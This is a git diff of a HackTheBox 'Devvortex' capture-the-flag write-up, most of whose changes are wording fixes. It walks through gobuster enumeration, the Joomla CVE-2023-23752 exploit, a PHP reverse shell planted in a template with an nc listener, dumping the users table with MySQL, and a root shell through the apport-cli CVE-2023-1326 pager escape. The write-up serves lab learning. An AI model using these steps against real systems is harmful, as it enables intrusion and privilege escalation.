@@ -10,7 +10,7 @@ image: devvortex.png
 Hello!
 
 In this write-up, we will dive into the **HackTheBox** [**Devvortex**](https://app.hackthebox.com/machines/577) machine.
-It is a **Linux** machine on which we will carry out a **Web enumeration** that will lead us to a Joomla login panel. When we have entered the admin panel, we will be able to get a **reverse shell** and we will have gained access to the system.
+It is a **Linux** machine on which we will carry out a **Web enumeration** that will lead us to a Joomla application. When we have entered to the admin dashboard, we will be able to get a **reverse shell** and access the system.
 Then, we will proceed to do a **privilege escalation** in order to own the system.
 
 
@@ -47,14 +47,13 @@ PORT	STATE	SERVICE
 80/tcp	open	http
 ```
 
+## Web Enumeration
+---
 After the port enumeration, we access to the browser to see what's on the http server.
 
 ![home](home.png)
 
-
-## Web Enumeration
----
-There doesn't seem to be anything interesting, so let's search for hidden directories with `dirbuster`.
+There doesn't seem to be anything interesting, so let's search for hidden directories with `gobuster`.
 
 ```bash
 gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
@@ -63,13 +62,14 @@ gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Conte
 ![gobuster1](gobuster_1.png)
 
 
-There doesn't seem to be anything, let's see what's out there looking for **Virtual Hostings**.
+There doesn't seem to be anything, let's see what's out there looking for **Virtual Hostings**:
 
 ```bash
 gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-5000.txt
 ```
 
-We found the virtual host "`dev.devvortex.htb`", let's access again the browser.
+
+We found the virtual host "`dev.devvortex.htb`", let's access the browser again.
 
 
 ![dev_home](dev_home.png)
@@ -79,20 +79,20 @@ After that, we go back to search for hidden directories, and we get:
 
 ![gobuster2](gobuster_2.png)
 
-Voilà! We found a directory "`/administrator`".
+Voilà! We found the directory "`/administrator`".
 
 ![admin](admin_page.png)
 
 
 ## Exploitation
 ---
-Inspecting the page we found session cookies but, after trying to use them to access using burpsuite, we realize that it is a **rabbit hole**.
+Inspecting the page we found session cookies but, after trying to use them to access the application using burpsuite, we realize that it is a **rabbit hole**.
 
 
-Searching for information on the internet, we found the tool `joomscan`, installed it and ran it against the machine.
+Searching for information, we found the tool `joomscan`, we installed it and ran it against the machine.
 We found that the server is using Joomla version 4.2.6, which is vulnerable to the [**CVE-2023-23752**](https://www.cvedetails.com/cve/CVE-2023-23752/)
 
-On the `exploit-db` website we found a PoC, so we download it and test it against the server.
+On the **exploit-db** website we found a PoC, so we download it and test it against the server.
 
 ![exploit](exploit.png)
 
@@ -109,12 +109,12 @@ however, we were able to access the Joomla admin panel.
 
 
 ### Obtaining a Reverse Shell
-Investigating a little bit through the dashboard interface, we found (inside the System section) a subsection calles Administrator templates.
-Inside, we found a pre-installated template, we acces and found this:
+Investigating a little bit through the dashboard interface, we found (inside the System section) a subsection called Administrator Templates.
+Inside, we found a pre-installed template, we access and found this:
 
 ![templates](templates_dash.png)
 
-To get a reverse shell, all we have to do is to inject a payload in any .php file and the open its path from the browser.
+To get a reverse shell, all we have to do is to inject a payload in any .php file and then open its path from the browser.
 
 We open the **login.php** file and write the following payload:
 
@@ -134,7 +134,7 @@ nc -lnvp 443
 And we are in!
 
 ### Obtaining the user flag
-In order to get the user flag we have to access the system with the user logan. As we saw when we ran the exploit, logan was also registered in Joomla, therefore, it must alse be in the database.
+In order to get the user flag we have to access the system with the user *logan*. As we saw when we ran the exploit, *logan* was also registered in Joomla, therefore, it must alse be registered in the database.
 
 We open `mysql`, but before, we create an interactive pseudo-terminal using:
 
@@ -148,11 +148,15 @@ Now, we access `mysql`:
 mysql -u lewis -p joomla --password=+++++++++
 ```
 
-Once we are inside mysql, we can see what's inside using the instruction: `SHOW TABLES;`
+Once we are inside mysql, we can see what's inside using the instruction:
+
+```sql
+SHOW TABLES;
+```
 
 We found 71 tables, but we are only interested in one: **sd4fg_users**. Let's see what contains:
 
-```SQL
+```sql
 SELECT * FROM sd4fg_users;
 ```
 
@@ -185,16 +189,16 @@ sudo -l
 
 After running it, we can see that the user logan has sudo access to the **apport-cli** tool. We run `apport-cli -v` and get that the version running is 2.20.11
 
-Searching the internet we find [this commit](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)
-that warns us of the [**CVE-2023-1326**](https://www.cvedetails.com/cve/CVE-2023-1326/) in this version and gives us a PoC to exploit it.
+Searching in google we find [this commit](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)
+that warns us of the [**CVE-2023-1326**](https://www.cvedetails.com/cve/CVE-2023-1326/) in this `apport-cli` version and gives us a PoC to exploit it.
 
-Al we need to do is execute the following:
+All we need to do is execute the following:
 
 ```bash
 sudo /usr/bin/apport-cli -c /var/crash/test.crash
 ```
 
-After executing this, we can see that we are asked to select a letter, we press 'v', wait for a few secinds and as if it were magic, we get the pager.
+After executing this, we can see that we are asked to select a letter, we press 'v', wait for a few seconds and as if it were magic, we get the pager.
 Now, all we need to do is run `!/bin/bash` and we spawn a root terminal.
 
 Finally, we have the whole system committed and, of course, we can now obtain the root flag of the machine.
